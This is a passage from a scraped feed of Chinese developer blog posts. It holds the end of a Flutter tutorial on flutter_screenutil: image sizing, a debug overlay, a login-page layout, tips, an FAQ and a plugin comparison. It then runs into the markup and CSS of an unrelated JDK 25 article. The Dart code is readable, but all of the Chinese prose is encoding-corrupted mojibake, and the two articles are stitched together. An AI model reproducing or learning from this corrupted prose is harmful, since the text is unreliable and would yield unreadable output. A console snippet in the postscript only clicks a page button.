<p>ç»“åˆ<code>Image</code>ç»„ä»¶å’Œ<code>flutter_screenutil</code>ï¼Œå®ç°å›¾ç‰‡åœ¨ä¸åŒå±å¹•ä¸Šçš„è‡ªé€‚åº”æ˜¾ç¤ºï¼š</p>
<pre><code class="hljs language-dart" lang="dart">Image.asset(
  <span class="hljs-string">'assets/images/banner.png'</span>,
  <span class="hljs-comment">// å®½åº¦é€‚é…å±å¹•ï¼Œé«˜åº¦æŒ‰æ¯”ä¾‹ç¼©æ”¾</span>
  width: <span class="hljs-built_in">double</span>.infinity,
  height: <span class="hljs-number">200.</span>h,
  fit: BoxFit.cover,
)

<span class="hljs-comment">// åœ†å½¢å¤´åƒé€‚é…</span>
Container(
  width: <span class="hljs-number">80.</span>w,
  height: <span class="hljs-number">80.</span>w,  <span class="hljs-comment">// å®½é«˜ä¸€è‡´ç¡®ä¿åœ†å½¢</span>
  decoration: BoxDecoration(
    shape: BoxShape.circle,
    image: DecorationImage(
      image: AssetImage(<span class="hljs-string">'assets/images/avatar.png'</span>),
      fit: BoxFit.cover,
    ),
  ),
)
</code></pre>
<h3 data-id="heading-17">4.4 é€‚é…æµ‹è¯•å·¥å…·</h3>
<p><code>flutter_screenutil</code>æä¾›äº†<code>ScreenUtilDebug</code>ç»„ä»¶ï¼Œæ–¹ä¾¿åœ¨å¼€å‘è¿‡ç¨‹ä¸­æŸ¥çœ‹é€‚é…ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// åœ¨ç•Œé¢åº•éƒ¨æ·»åŠ è°ƒè¯•ä¿¡æ¯</span>
Stack(
  children: [
    <span class="hljs-comment">// ä¸»å†…å®¹åŒº</span>
    <span class="hljs-keyword">const</span> YourMainContent(),
    <span class="hljs-comment">// è°ƒè¯•ä¿¡æ¯ï¼ˆä»…åœ¨å¼€å‘ç¯å¢ƒæ˜¾ç¤ºï¼‰</span>
    <span class="hljs-keyword">if</span> (kDebugMode)
      Positioned(
        bottom: <span class="hljs-number">20.</span>h,
        left: <span class="hljs-number">0</span>,
        right: <span class="hljs-number">0</span>,
        child: ScreenUtilDebug(
          <span class="hljs-comment">// æ˜¾ç¤ºå½“å‰å±å¹•ä¿¡æ¯ã€é€‚é…æ¯”ä¾‹ç­‰</span>
          infoType: ScreenUtilInfoType.all,
        ),
      ),
  ],
)
</code></pre>
<h2 data-id="heading-18">5. å®æˆ˜æ¡ˆä¾‹ï¼šç™»å½•é¡µé¢é€‚é…</h2>
<p>ä¸‹é¢é€šè¿‡ä¸€ä¸ªå®Œæ•´çš„ç™»å½•é¡µé¢æ¡ˆä¾‹ï¼Œå±•ç¤º<code>flutter_screenutil</code>çš„ç»¼åˆåº”ç”¨ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> LoginPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      body: SingleChildScrollView(
        padding: EdgeInsets.symmetric(horizontal: <span class="hljs-number">30.</span>w, vertical: <span class="hljs-number">80.</span>h),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            <span class="hljs-comment">// åº”ç”¨Logo</span>
            Image.asset(
              <span class="hljs-string">'assets/images/logo.png'</span>,
              width: <span class="hljs-number">120.</span>w,
              height: <span class="hljs-number">120.</span>w,
            ),
            SizedBox(height: <span class="hljs-number">40.</span>h),
            
            <span class="hljs-comment">// æ ‡é¢˜</span>
            Text(
              <span class="hljs-string">'æ¬¢è¿ç™»å½•'</span>,
              style: TextStyle(
                fontSize: <span class="hljs-number">24.</span>sp,
                fontWeight: FontWeight.bold,
                color: Colors.black87,
              ),
            ),
            SizedBox(height: <span class="hljs-number">60.</span>h),
            
            <span class="hljs-comment">// è´¦å·è¾“å…¥æ¡†</span>
            TextField(
              decoration: InputDecoration(
                hintText: <span class="hljs-string">'è¯·è¾“å…¥è´¦å·'</span>,
                hintStyle: TextStyle(fontSize: <span class="hljs-number">14.</span>sp, color: Colors.grey),
                contentPadding: EdgeInsets.symmetric(
                  horizontal: <span class="hljs-number">16.</span>w,
                  vertical: <span class="hljs-number">14.</span>h,
                ),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(<span class="hljs-number">8.</span>w),
                  borderSide: BorderSide(width: <span class="hljs-number">1.</span>w, color: Colors.grey[<span class="hljs-number">300</span>]!),
                ),
              ),
              style: TextStyle(fontSize: <span class="hljs-number">16.</span>sp),
            ),
            SizedBox(height: <span class="hljs-number">20.</span>h),
            
            <span class="hljs-comment">// å¯†ç è¾“å…¥æ¡†</span>
            TextField(
              obscureText: <span class="hljs-keyword">true</span>,
              decoration: InputDecoration(
                hintText: <span class="hljs-string">'è¯·è¾“å…¥å¯†ç '</span>,
                hintStyle: TextStyle(fontSize: <span class="hljs-number">14.</span>sp, color: Colors.grey),
                contentPadding: EdgeInsets.symmetric(
                  horizontal: <span class="hljs-number">16.</span>w,
                  vertical: <span class="hljs-number">14.</span>h,
                ),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(<span class="hljs-number">8.</span>w),
                  borderSide: BorderSide(width: <span class="hljs-number">1.</span>w, color: Colors.grey[<span class="hljs-number">300</span>]!),
                ),
              ),
              style: TextStyle(fontSize: <span class="hljs-number">16.</span>sp),
            ),
            SizedBox(height: <span class="hljs-number">30.</span>h),
            
            <span class="hljs-comment">// ç™»å½•æŒ‰é’®</span>
            SizedBox(
              width: <span class="hljs-built_in">double</span>.infinity,
              height: <span class="hljs-number">50.</span>h,
              child: ElevatedButton(
                onPressed: () {},
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.blue,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(<span class="hljs-number">8.</span>w),
                  ),
                ),
                child: Text(
                  <span class="hljs-string">'ç™»å½•'</span>,
                  style: TextStyle(fontSize: <span class="hljs-number">18.</span>sp, color: Colors.white),
                ),
              ),
            ),
            
            <span class="hljs-comment">// åº•éƒ¨æ–‡å­—</span>
            SizedBox(height: <span class="hljs-number">40.</span>h),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Text(
                  <span class="hljs-string">'è¿˜æ²¡æœ‰è´¦å·ï¼Ÿ'</span>,
                  style: TextStyle(fontSize: <span class="hljs-number">14.</span>sp, color: Colors.grey[<span class="hljs-number">600</span>]),
                ),
                TextButton(
                  onPressed: () {},
                  child: Text(
                    <span class="hljs-string">'ç«‹å³æ³¨å†Œ'</span>,
                    style: TextStyle(fontSize: <span class="hljs-number">14.</span>sp, color: Colors.blue),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}
</code></pre>
<h2 data-id="heading-19">6. æ€§èƒ½ä¼˜åŒ–ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-20">6.1 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<ol>
<li><strong>é¿å…é¢‘ç¹åˆå§‹åŒ–</strong>ï¼š<code>ScreenUtilInit</code>åº”åœ¨åº”ç”¨é¡¶å±‚åˆå§‹åŒ–ä¸€æ¬¡ï¼Œé¿å…åœ¨å­é¡µé¢é‡å¤åˆå§‹åŒ–</li>
<li><strong>å‡å°‘ä¸å¿…è¦çš„å°ºå¯¸è®¡ç®—</strong>ï¼šå¯¹äºå›ºå®šæ¯”ä¾‹çš„UIå…ƒç´ ï¼Œå¯ç¼“å­˜è®¡ç®—ç»“æœ</li>
<li><strong>åˆç†ä½¿ç”¨<code>const</code>æ„é€ å‡½æ•°</strong>ï¼šå¯¹äºä¸ä¾èµ–å°ºå¯¸å˜åŒ–çš„Widgetï¼Œä½¿ç”¨<code>const</code>ä¿®é¥°ä»¥æé«˜æ€§èƒ½</li>
<li><strong>é¿å…è¿‡åº¦é€‚é…</strong>ï¼šå¯¹äºè£…é¥°æ€§å…ƒç´ ï¼ˆå¦‚åˆ†å‰²çº¿ï¼‰ï¼Œå¯ä½¿ç”¨å›ºå®šåƒç´ å€¼ï¼ˆå¦‚1pxï¼‰ï¼Œæ— éœ€é€‚é…</li>
</ol>
<h3 data-id="heading-21">6.2 æœ€ä½³å®è·µæ€»ç»“</h3>
<ol>
<li><strong>ç»Ÿä¸€è®¾è®¡ç¨¿åŸºå‡†</strong>ï¼šä¸UIå›¢é˜Ÿçº¦å®šç»Ÿä¸€çš„è®¾è®¡ç¨¿å°ºå¯¸ï¼ˆå¦‚iPhone Xçš„375Ã—812pxï¼‰</li>
<li><strong>ä¼˜å…ˆä½¿ç”¨æ–¹å‘åç¼€</strong>ï¼šå®½åº¦ç›¸å…³ç”¨<code>.w</code>ï¼Œé«˜åº¦ç›¸å…³ç”¨<code>.h</code>ï¼Œå­—ä½“ç”¨<code>.sp</code></li>
<li><strong>æµ‹è¯•å¤šè®¾å¤‡åœºæ™¯</strong>ï¼šåœ¨ä¸åŒå°ºå¯¸ã€ä¸åŒDPIçš„æ¨¡æ‹Ÿå™¨/çœŸæœºä¸Šæµ‹è¯•é€‚é…æ•ˆæœ</li>
<li><strong>ç»“åˆç³»ç»Ÿè®¾ç½®</strong>ï¼šé€šè¿‡<code>minTextAdapt</code>ç¡®ä¿å­—ä½“é€‚é…ç³»ç»Ÿç¼©æ”¾è®¾ç½®</li>
<li><strong>æ–‡æ¡£åŒ–é€‚é…è§„åˆ™</strong>ï¼šåœ¨é¡¹ç›®ä¸­å»ºç«‹é€‚é…è§„èŒƒæ–‡æ¡£ï¼Œç¡®ä¿å›¢é˜Ÿæˆå‘˜ç»Ÿä¸€ä½¿ç”¨</li>
</ol>
<h2 data-id="heading-22">7. å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-23">Q1: é€‚é…åUIåœ¨æŸäº›è®¾å¤‡ä¸Šä»æœ‰å˜å½¢ï¼Ÿ</h3>
<p>A1: æ£€æŸ¥æ˜¯å¦æ··ç”¨äº†é€‚é…å•ä½å’ŒåŸå§‹å•ä½ï¼ˆå¦‚åŒæ—¶ä½¿ç”¨<code>100.w</code>å’Œ<code>100.0</code>ï¼‰ï¼Œç¡®ä¿æ‰€æœ‰å°ºå¯¸éƒ½ä½¿ç”¨<code>flutter_screenutil</code>çš„é€‚é…å•ä½ã€‚</p>
<h3 data-id="heading-24">Q2: å­—ä½“é€‚é…åä»ä¸å“åº”ç³»ç»Ÿå­—ä½“ç¼©æ”¾ï¼Ÿ</h3>
<p>A2: ç¡®è®¤<code>ScreenUtilInit</code>çš„<code>minTextAdapt</code>è®¾ç½®ä¸º<code>true</code>ï¼Œå¹¶ä¸”å­—ä½“å°ºå¯¸ä½¿ç”¨<code>.sp</code>åç¼€ï¼Œè€Œé<code>.w</code>æˆ–<code>.h</code>ã€‚</p>
<h3 data-id="heading-25">Q3: å…¨é¢å±åº•éƒ¨æœ‰ç•™ç™½æˆ–å†…å®¹è¢«é®æŒ¡ï¼Ÿ</h3>
<p>A3: ä½¿ç”¨<code>ScreenUtil().bottomBarHeight</code>è·å–åº•éƒ¨å®‰å…¨åŒºåŸŸé«˜åº¦ï¼Œåœ¨åº•éƒ¨æ·»åŠ å¯¹åº”é«˜åº¦çš„<code>SizedBox</code>æˆ–<code>Padding</code>ã€‚</p>
<h3 data-id="heading-26">Q4: æ¨ªç«–å±åˆ‡æ¢æ—¶é€‚é…å¤±æ•ˆï¼Ÿ</h3>
<p>A4: åœ¨<code>ScreenUtilInit</code>ä¸­è®¾ç½®<code>splitScreenMode: true</code>ï¼Œå¹¶ç¡®ä¿å¸ƒå±€èƒ½å¤Ÿå“åº”å±å¹•æ–¹å‘å˜åŒ–ã€‚</p>
<h2 data-id="heading-27">8. æ’ä»¶å¯¹æ¯”ä¸é€‰å‹å»ºè®®</h2>





























<table><thead><tr><th>é€‚é…æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>flutter_screenutil</td><td>APIç®€æ´ã€å­¦ä¹ æˆæœ¬ä½ã€åŠŸèƒ½å…¨é¢</td><td>éœ€ä¾èµ–ç¬¬ä¸‰æ–¹åº“</td><td>å¤§å¤šæ•°Flutteråº”ç”¨ï¼Œå°¤å…¶æ˜¯ä¸­å°å‹é¡¹ç›®</td></tr><tr><td>åŸç”ŸMediaQuery</td><td>æ— ä¾èµ–ã€ç³»ç»ŸåŸç”Ÿæ”¯æŒ</td><td>éœ€æ‰‹åŠ¨è®¡ç®—æ¯”ä¾‹ã€ä»£ç å†—ä½™</td><td>ç®€å•é€‚é…åœºæ™¯ï¼Œæˆ–å¯¹ç¬¬ä¸‰æ–¹åº“æ•æ„Ÿçš„é¡¹ç›®</td></tr><tr><td>responsive_framework</td><td>æ”¯æŒæ–­ç‚¹é€‚é…ã€å¸ƒå±€é‡ç»„</td><td>é…ç½®å¤æ‚ã€å­¦ä¹ æˆæœ¬é«˜</td><td>å¤§å‹åº”ç”¨ã€éœ€è¦ç²¾ç»†å“åº”å¼å¸ƒå±€çš„åœºæ™¯</td></tr></tbody></table>
<p><strong>é€‰å‹å»ºè®®</strong>ï¼š</p>
<ul>
<li>å¯¹äºå¤§å¤šæ•°Flutteråº”ç”¨ï¼Œ<code>flutter_screenutil</code>æ˜¯æ€§ä»·æ¯”æœ€é«˜çš„é€‰æ‹©ï¼Œèƒ½å¤Ÿä»¥æœ€ä½çš„å­¦ä¹ æˆæœ¬å®ç°é«˜è´¨é‡çš„å±å¹•é€‚é…</li>
<li>å¯¹äºéœ€è¦æ”¯æŒå¤šç§å±å¹•å°ºå¯¸ï¼ˆå¦‚æ‰‹æœºã€å¹³æ¿ã€ç”µè„‘ï¼‰çš„å¤æ‚åº”ç”¨ï¼Œå¯ç»“åˆ<code>responsive_framework</code>å’Œ<code>flutter_screenutil</code>ä½¿ç”¨</li>
<li>å¯¹äºæç®€åº”ç”¨æˆ–å¯¹åŒ…ä½“ç§¯æœ‰ä¸¥æ ¼è¦æ±‚çš„åœºæ™¯ï¼Œå¯è€ƒè™‘åŸç”Ÿ<code>MediaQuery</code>æ–¹æ¡ˆ</li>
</ul>
<p>å®˜æ–¹ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenFlutter%2Fflutter_screenutil" target="_blank" title="https://github.com/OpenFlutter/flutter_screenutil" ref="nofollow noopener noreferrer">flutter_screenutil GitHub</a>ï¼Œå¯è·å–æœ€æ–°ç‰ˆæœ¬ã€æäº¤ Issueã€æŸ¥çœ‹å®˜æ–¹ç¤ºä¾‹ä»£ç â€‹</p>
<hr/>
<blockquote>
<p>æœ¬æ¬¡åˆ†äº«å°±åˆ°è¿™å„¿å•¦ï¼Œæˆ‘æ˜¯é¹å¤šå¤šï¼Œæ·±è€•å‰ç«¯çš„æŠ€æœ¯åˆ›ä½œè€…ï¼Œå¦‚æœæ‚¨çœ‹äº†è§‰å¾—æœ‰å¸®åŠ©ï¼Œæ¬¢è¿è¯„è®ºï¼Œå…³æ³¨ï¼Œç‚¹èµï¼Œè½¬å‘ï¼Œæˆ‘ä»¬ä¸‹æ¬¡è§~</p>
</blockquote>
<p>PSï¼šåœ¨æœ¬é¡µæŒ‰F12ï¼Œåœ¨consoleä¸­è¾“å…¥document.getElementsByClassName('panel-btn')[0].click();æœ‰æƒŠå–œå“¦~</p>
<p><code>å¾€æœŸæ–‡ç« </code></p>
<ul>
<li><a href="https://juejin.cn/post/7570923924365230143" target="_blank" title="https://juejin.cn/post/7570923924365230143">flutterå›¾ç‰‡é€‰æ‹©åº“multi_image_picker_pluså’Œimage_pickerçš„å¯¹æ¯”å’Œä½¿ç”¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7568136081302978623" target="_blank" title="https://juejin.cn/post/7568136081302978623">è§£é”flutterå¼¹çª—æ–°å§¿åŠ¿ï¼šdialog-flutter_smart_dialogæ’ä»¶è§£è¯»+æ¡ˆä¾‹</a></li>
<li><a href="https://juejin.cn/post/7559089440901545999" target="_blank" title="https://juejin.cn/post/7559089440901545999">flutter-åˆ‡æ¢çŠ¶æ€æ˜¾ç¤ºä¸åŒç»„ä»¶10ç§å®ç°æ–¹æ¡ˆå…¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7555079970491318308" target="_blank" title="https://juejin.cn/post/7555079970491318308">flutter-è¯¦è§£æ§åˆ¶ç»„ä»¶æ˜¾ç¤ºçš„ä¸¤ç§æ–¹å¼Offstageä¸Visibility</a></li>
<li><a href="https://juejin.cn/post/7535358416182788122" target="_blank" title="https://juejin.cn/post/7535358416182788122">flutter-ä½¿ç”¨AnimatedDefaultTextStyleå®ç°æ–‡æœ¬åŠ¨ç”»</a></li>
<li><a href="https://juejin.cn/post/7537339432291434496" target="_blank" title="https://juejin.cn/post/7537339432291434496">flutter-ä½¿ç”¨SafeAreaç»„ä»¶å¤„ç†å„æœºå‹çš„å®‰å…¨è·ç¦»</a></li>
<li><a href="https://juejin.cn/spost/7537593417099149321" target="_blank" title="https://juejin.cn/spost/7537593417099149321">flutter-å®ç°æ¸å˜è‰²è¾¹æ¡†èƒŒæ™¯ä»¥åŠæ¸å˜è‰²æ–‡å­—</a></li>
<li><a href="https://juejin.cn/post/7543474419240370185" target="_blank" title="https://juejin.cn/post/7543474419240370185">flutter-ä½¿ç”¨confettiåˆ¶ä½œç‚«é…·çº¸å±‘çˆ†ç‚¸ç²’å­åŠ¨ç”»</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[yydsï¼ŒJDK 25 ç»ˆç»“ importï¼Œå¯ä»¥åƒ Python ä¸€æ ·ç®€å•ç²—æš´äº†]]></title>    <link>https://juejin.cn/post/7581292270960803850</link>    <guid>https://juejin.cn/post/7581292270960803850</guid>    <pubDate>2025-12-08T09:05:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581292270960803850" data-draft-id="7581251003329691674" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="yydsï¼ŒJDK 25 ç»ˆç»“ importï¼Œå¯ä»¥åƒ Python ä¸€æ ·ç®€å•ç²—æš´äº†"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-08T09:05:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‹¼çˆ·"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            yydsï¼ŒJDK 25 ç»ˆç»“ importï¼Œå¯ä»¥åƒ Python ä¸€æ ·ç®€å•ç²—æš´äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‹¼çˆ·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T09:05:39.000Z" title="Mon Dec 08 2025 09:05:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body 